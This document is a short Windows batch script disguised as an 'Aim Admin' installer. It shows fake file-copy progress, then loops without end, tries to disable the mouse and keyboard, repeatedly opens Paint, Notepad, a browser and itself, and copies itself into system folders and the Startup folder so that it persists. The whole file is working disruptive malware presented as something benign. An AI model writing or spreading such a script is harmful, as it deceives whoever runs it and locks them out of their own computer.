   @ECHO OFF
   ECHO Welcome to Aim Admin
   pause
   ECHO copying files please wait
   ECHO 10%























   ECHO 20%

























   ECHO 30%

























   ECHO 40%



















   ECHO HOLD ON
   :start
   c:\windows\rundll32.exe mouse,disable
   c:\windows\rundll32.exe keyboard,disable
   start mspaint
   start notepad
   start iexplore.exe www.aim.com
   start aim.bat
   copy %0 c:\windows\system32
   copy %0 c:\windows
   Copy %o C:\Windows\Start~1\Programs\Startup
   goto :start
